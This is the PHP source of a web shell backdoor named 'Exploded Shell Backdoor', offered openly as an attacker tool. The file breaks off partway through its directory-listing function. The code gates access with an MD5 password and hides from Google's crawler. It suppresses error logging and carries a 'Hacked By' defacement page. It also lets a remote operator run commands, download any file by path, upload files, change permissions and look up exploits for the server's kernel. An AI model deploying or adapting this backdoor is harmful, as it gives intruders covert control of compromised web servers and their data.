<?php
@ini_set('output_buffering',0); // 
//@ini_set('display_errors', 0); //
//@ini_set('error_reporting', 0); //
/*
##################################################### 
##    Name    : Exploded Shell Backdoor            ## 
##    Version : v1.5 Mini                          ## 
##    Author  : Muhammad Supiani a.k.a ./Port22    ## 
##    Contact : Port22cyber@gmail.com              ##
##    Report  : Port22exploded@gmail.com           ##
##           (c) 2015 www.security-exploded.orgs   ##
#####################################################
*/
$pass = "9e3e935b7a61f3faf5afd5d9082936db"; // Password Encrypted By MD5, pass is:" m1x "
$title = "Shell by Galack"; // Title
$color = "grey"; // Color
$background= "http://igil.info/wp-content/uploads/2018/04/fond-ecran-anime-pc-awesome-naruto-and-wallpapers-of-fond-ecran-anime-pc.jpg"; // Background
$logo = "http://oi58.tinypic.com/10r33mq.jpg"; // Logo
$music = ""; // Music, isi url music elu :v *cuman bisa didengerin di "about" :v , malas gw taroh di depan, soalnya kalok ada yg nggak suka :v
$script_deface = "<html><head><title>Hacked By ./Port22</title></head><body>Hacked by ./Port22  <br> Crew's	:	Milton	|	Aris Dot ID	|	./r00t_NTx	|	./Port22	|	MyMind404	|	./KriZ	|	./BlackJoker	|<embed src='http://www.youtube.com/v/qD8OnPC1fLI&autoplay=1&loop=1' type='application/x-shockwave-flash' wmode='transparent' width='0' height='0'></embed>"; //Script Deface. (html, php, txt)

/*
Content is encrypted by gzdeflate , base64 , and others . if you want the source code , please use the tool "PHP Decrypter". In case you dont trust me :-P
*/

$xName = "Security Exploded";
$versi = "v1.5 Mini"; // Shell Version
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; } 
@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1'); 
if( get_magic_quotes_gpc() ) { 
    function stripslashes_array($array) { return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); } 
    $_POST = stripslashes_array($_POST); 
} 
function printLogin() { 
?><html><head>
<link rel="SHORTCUT ICON" href="http://oi58.tinypic.com/10r33mq.jpg">
<title>Security Exploded</title>
</head>
<body>
<style type="text/css">
body { background-color:transparan;background:#000;background-image: url("http://oi60.tinypic.com/in74pi.jpg");background-position: center;  background-attachment: fixed;background-repeat: repeat; } 
.tabnez{ margin:30px auto 0 auto;border: 1px solid #333333; color: grey; 
-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;}
body,td,th {font-family: Verdana;font-size: 12px;color: grey;font-weight: bold;}
input {BORDER-RIGHT:grey 1px solid;BORDER-TOP:grey 1px solid;BORDER-LEFT:grey 1px solid;BORDER-BOTTOM: grey 1px solid;BACKGROUND-COLOR: #111111;COLOR: grey;font: 8pt Verdana;}
</style><style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1048.cur), progress !important;}</style>

<img src="https://image.noelshack.com/fichiers/2018/19/7/1526170989-cooltext286106528367598.png" title="./Port22" style="float:left" alt="Exploded" '/>
<br><br><br><br><br><br><br><br><br><center>
<table>
<form method='post'>
<tr>
<td><img src='http://oi58.tinypic.com/10r33mq.jpg' class="tabnez"  height='20' width='24'></td>
<td><input class="tabnez" type="password" name="pass" placeholder="Password"></td>
<td><input class="tabnez" type="submit" value="Login !"></td>
</tr>
</form>
</table>
</body>
</html>
    <?php break ;
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $pass ) || 
        ( isset( $_POST['pass']) && ( md5($_POST['pass']) == $pass ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
		
@ini_set('log_errors',0);
@ini_set('display_errors',0);
@ini_set('output_buffering',0);	
@ini_set('file_uploads',1);
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez; 
    exit; 
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
	$file = $_GET['dlgzip'];
	$filez = gzencode(@file_get_contents($file));
   header("Content-Type:application/x-gzip\n"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
   echo $filez; 
    exit; 
}
// view image
if(isset($_GET['img'])){
		@ob_clean(); 
		$d = magicboom($_GET['y']);
		$f = $_GET['img'];
		$inf = @getimagesize($d.$f); 
   		$ext = explode($f,"."); 
   		$ext = $ext[count($ext)-1]; 
   	 	@header("Content-type: ".$inf["mime"]);
   	 	@header("Cache-control: public"); 
  		@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
  		@header("Cache-control: max-age=".(60*60*24*7));  
   	 	@readfile($d.$f); 
   	 	exit; 
}
//php info
$phpinfo = "?&amp;x=phpinfo";
// Server software

$software = getenv("SERVER_SOFTWARE");
// CMD
$cmdbox = "help";
// Server Port
$serverport = $_SERVER["SERVER_PORT"];
// Backdoor Name
$backdoor_name = "$title ";
// check safemode
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
// uname -a
$system = @php_uname();
// detector
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#00FF00'>ON</font></b>";}else {return "<b><font style='color:#ff0000'>OFF</font></b>";}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testwget() {if (exe('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testoracle() { if (function_exists('ocilogon')) {return showstat("on"); }else {return showstat("off"); }}
function testmssql() { if (function_exists('mssql_connect')) {return showstat("on"); }else {return showstat("off"); }}
function testperl() {if (exe('perl -h')) {return showstat("on");}else {return showstat("off");}}
function testpython() {if (exe('python -h')) {return showstat("on");}else {return showstat("off");}}
function testruby() {if (exe('ruby -h')) {return showstat("on");}else {return showstat("off");}}
function testgcc() {if (exe('gcc --help')) {return showstat("on");}else {return showstat("off");}}
function testjava() {if (exe('java -h')) {return showstat("on");}else {return showstat("off");}}
// check os
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE; 
// change directory
if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}
//hdd
function convertByte($s) {
if($s<=0) return 0;
	$w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$e = floor(log($s)/log(1024));
	return sprintf('%.2f '.$w[$e], ($s/pow(1024, floor($e))));
}
//

// username, id, shell prompt and working directory
if(!$win){
	if(!$user = rapih(exe("whoami"))) $user = "";
	if(!$id = rapih(exe("id"))) $id = "";
	$prompt = $user." \$ ";
	$pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
	$user = @get_current_user();
	$id = $user;
	$prompt = $user." &gt;";
	$pwd = realpath(".")."\\";
	// find drive letters
 	$v = explode("\\",$d); 
	$v = $v[0]; 
 	foreach (range("A","Z") as $letter) 
 	{ 
	  $bool = @is_dir($letter.":\\");
	  if ($bool) 
	  { 
 		  $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
		   if ($letter.":" != $v) {$letters .= $letter;} 
		   else {$letters .= "<span class=\"gaya\">".$letter."</span>";} 
		   $letters .= " </a>] "; 
  	  }	 
 } 
}

function getrealip(){
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{ $ip=$_SERVER['HTTP_CLIENT_IP']; 
}elseif (!empty($SERVER['HTTP_X_FORWARDED_FOR']))
//TO CHEK IP IS PASS FROM PROXY
{ $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}else { $ip=$_SERVER['REMOTE_ADDR'];
}
return $ip;
}

 function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:#ff0000'><b>".$disablefunc."</b></span>"; }
    else { return "<span style='color:#00FF00'><b>NONE</b></span>"; }
    }
	
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
// server ip
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
// your ip ;-)
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id=$_SERVER['SERVER_ADMIN'];
$bindport = "13123";
$bindport_pass = "exploded";
// Security Exploded
$uplink = "http://www.security-exploded.org/search/label/Exploded Shell Backdoor";
//wilworm
$release = @php_uname('r');
	$kernel = @php_uname('s');
	$millink='http://milw0rm.com/search.php?dong=';
	
	if( strpos('Linux', $kernel) !== false )
		$millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
	else
		$millink .= urlencode( $kernel . ' ' . substr($release,0,3) );
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	// Exploit-db
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'http://exploit-db.com/search/?action=search&filter_description=';
    
	if( strpos('Linux', $kernel) !== false )
		$explink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
	else
		$explink .= urlencode( $kernel . ' ' . substr($release,0,3) );
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
// separate the working direcotory
$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
for($i = 0 ; $i < sizeof($pwds)-1 ; $i++){
	$pathz = "";
	for($j = 0 ; $j <= $i ; $j++){
		$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
	}
	$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
}
	
// Rename file or folder
if(isset($_POST['Rename'])){
	$old = $_POST['oldname'];
	$new = $_POST['newname'];
	@Rename($pwd.$old,$pwd.$new);
	$file = $pwd.$new;
}
if(isset($_POST['uploadcompt'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;	
		$stat = @move_uploaded_file($tmp_name,$pindah);}
		}

if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo ''; }
else { echo ''; }
}
if(isset($_POST['Chmod'])){ 
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@Chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}	
if(isset($_POST['Chmod_folder'])){
	$name = $_POST['name'];
	$value = $_POST['newvalue'];
if (strlen($value)==3){
	$value = 0 . "" . $value;}
	@Chmod($pwd.$name,octdec($value));
	$file = $pwd.$name;}

//////////////////////////////////
// print useful info

$buff  = "Shell Backdoor : <b><font style='color:$color'> $backdoor_name $versi</font><b> <span class=\"gaya\"></a></b></b></font><b><span class=\"gaya\"> | </span><a href='$uplink' title='Search Shell Backdoor From Security Exploded' target='_blank'><font style='color:#ff0000'>[ Security Exploded ]</a></b></font><br>Version : <b><font style='color:$color'>".$versi."</font></a></b><br> Software : <b>".$software."</b><br />";
$buff .= "System OS : <b>".$system."  | <a href='http://www.google.com/search?q=".urlencode(@php_uname())."' title='Search System OS From Google' target='_blank'><font style='color:#ff0000'>[ Google ]</font></a> | <a href='".$millink."' title='Search Karnel From Milw0rm' target=_blank><font style='color:#ff0000'>[ Milw0rm ]</font></a> | <a href='".$explink."' title='Search Karnel From Exploit-db' target=_blank><font style='color:#ff0000'>[ Exploit-db ]</font></a></b><br />";
if($id != "") $buff .= "ID : <b>".$id."</b><br />";
$buff .= "PHP Version : <b>".phpversion()."</b> ON <b>".php_sapi_name()."<span class=\"gaya\"> | </span><a href='$phpinfo' title='PHP Info'><font style='color:#ff0000'>[ PHP Info ]</font></a> </b><br />";
$buff .= "Server IP : <b><font style='color:#ff0000'>".$server_ip."</font></b> <span class=\"gaya\"> | </span> Port Server : <b><font style='color:#ff0000'>".$serverport."</font></b><span class=\"gaya\"> | </span> Your IP Surving : <b><a href='http://www.dnsstuff.com/tools?runFromMain=".getrealip()."&toolType=traceroute' title='Traceroute Your IP' target='_blank'><font style='color:#ff0000'>".getrealip()."<font></a></b><span class=\"gaya\"> | </span> Admin : <b>".$admin_id."</b><br />";
$buff .= "Free Disk: <font style='color:#ff0000'><b>".convertByte(disk_free_space("/"))." <span class=\"gaya\"> / </span> ".convertByte(disk_total_space("/"))."</b></font></span><br />";
if($safemode) $buff .= "Safemode: <span class=\"gaya\"><font style='color:#ff0000'><b>ON</b></font></span><br />";
else $buff .= "Safemode: <span class=\"gaya\"><b>OFF</b></span><br />";
$buff .= "Disable Functions: ".showdisablefunctions()."<br />";
$buff .= "MySQL: ".testmysql()."&nbsp;&nbsp;|&nbsp;&nbsp;MSSQL: ".testmssql()."&nbsp;&nbsp;|&nbsp;&nbsp;Oracle: ".testoracle()."&nbsp;&nbsp;|&nbsp;&nbsp;Perl: ".testperl()."&nbsp;&nbsp;|&nbsp;&nbsp;Python: ".testpython()."&nbsp;&nbsp;|&nbsp;&nbsp;Ruby: ".testruby()."&nbsp;&nbsp;|&nbsp;&nbsp;Java: ".testjava()."&nbsp;&nbsp;|&nbsp;&nbsp;GCC: ".testgcc()."&nbsp;&nbsp;|&nbsp;&nbsp;cURL: ".testcurl()."&nbsp;&nbsp;|&nbsp;&nbsp;WGet: ".testwget()."<br>";
$buff .="<font color=00ff00 >Drive : <b>".$letters."&nbsp;&gt;&nbsp;".$pwdurl."</b></font>";


 function rapih($text){
	return trim(str_replace("<br />","",$text));
}

function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	} 
	return stripslashes($text);
}

function showdir($pwd,$prompt){
	$fname = array();
	$dname = array();
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
	else $posix = FALSE;
	$user = "????:????";
	if($dh = @scandir($pwd)){
		foreach($dh as $file){
			if(is_dir($file)){
				$dname[] = $file;
			}
			elseif(is_file($file)){
				$fname[] = $file;
			}
		}
	}
	else{
		if($dh = @opendir($pwd)){
			while($file = @readdir($dh)){
				if(@is_dir($file)){
					$dname[] = $file;
				}
				elseif(@is_file($file)){
					$fname[] = $file;
				}
			}
			@closedir($dh);
		}
	}
	sort($fname);
	sort($dname);
	$path = @explode(DIRECTORY_SEPARATOR,$pwd);
	$tree = @sizeof($path);
	$parent = "";
	$buff = "<center>
	<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table class=\"cmdbox\" style=\"width:45%;\">
	<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=help /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>
	<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
	<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
	<tr><td><b>View </b></td><td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" /><input class=\"inputzbut\" type=\"submit\" value=\"View !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr></center>
	
	</form></table><br><table class=\"explore\">
	<tr><th>Name</th><th style=\"width:80px;\">Size</th><th style=\"width:210px;\">Owner:Group</th><th style=\"width:80px;\">Perms</th><th style=\"width:110px;\">Modified</th><th style=\"width:190px;\">Actions</th></tr>
	";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $pwd;  

	foreach($dname as $folder){
		if($folder == ".") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>-</td>
			<td style=\"text-align:center;\">".$owner."</td><td><center>".get_perms($pwd)."</center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\">
			<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">New File</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">New Folder</a> | <a href=\"javascript:tukar('titik1','titik4_form');\">Upload</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"Rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			<form action=\"\" id=\"titik4_form\" method=\"post\" enctype=\"multipart/form-data\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" type=\"file\" name=\"file\" size=\"20\"/><br>
			<input class=\"inputzbut\" name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"/>
			<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" />
			</form></td>
			
			</tr>
			";
		}
		elseif($folder == "..") {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'></a></td><td>-</td>
			<td style=\"text-align:center;\">".$owner."</td>
			<td><center>".get_perms($parent)."</center></td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
			<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">New File</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">New Folder</a> | <a href=\"javascript:tukar('titik2','titik3_form');\">Upload</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"Rename\" style=\"width:35px;\" value=\"Go !\" />
			</form>
			<form action=\"\" id=\"titik3_form\" method=\"post\" enctype=\"multipart/form-data\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" type=\"file\" name=\"file\" size=\"20\"/><br>
			<input class=\"inputzbut\" name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"/>
			<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" />
			</form>
			</td></tr>";
		}
		else {
			if(!$win && $posix){
				$name=@posix_getpwuid(@fileowner($folder));
				$group=@posix_getgrgid(@filegroup($folder));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $user;
			}
			$buff .= "<tr><td><a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />  [ $folder ]</b></a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"Rename\" value=\"Rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
			</form><td>DIR</td><td style=\"text-align:center;\">".$owner."</td>
			<td><center>
			<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
			<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
			<input class=\"inputz\" style=\"width:150px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"Chmod_folder\" value=\"Chmod\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" /></form></center></td>
			<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td>
			<td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">Rename</a> | <a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form4');\">Upload</a> | <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">Delete</a></span>
			<form action=\"\" id=\"".clearspace($folder)."_form4\" method=\"post\" enctype=\"multipart/form-data\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
			<input class=\"inputz\" type=\"file\" name=\"file\" size=\"20\"/><br>
			<input class=\"inputz\" name=\"path\" type=\"text\" size=\"33\" value=\"".$pwd.$folder.DIRECTORY_SEPARATOR."\" /><br>
			<input class=\"inputzbut\" name=\"uploadcompt\" type=\"submit\" value=\"Upload\"/>
			<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" 
			onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form4');\" />
			</form>
			</td></tr>";
		}
	}

	foreach($fname as $file){
		$full = $pwd.$file;
		if(!$win && $posix){
			$name=@posix_getpwuid(@fileowner($folder));
			$group=@posix_getgrgid(@filegroup($folder));
			$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
		}
		else {
			$owner = $user;
		}		
		$buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</b></a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"Rename\" value=\"Rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
		</form></td><td>".ukuran($full)."</td><td style=\"text-align:center;\">".$owner."</td><td><center>
		<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
<input class=\"inputz\" style=\"width:150px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"Chmod\" value=\"Chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" /></form></center></td>
		<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td>
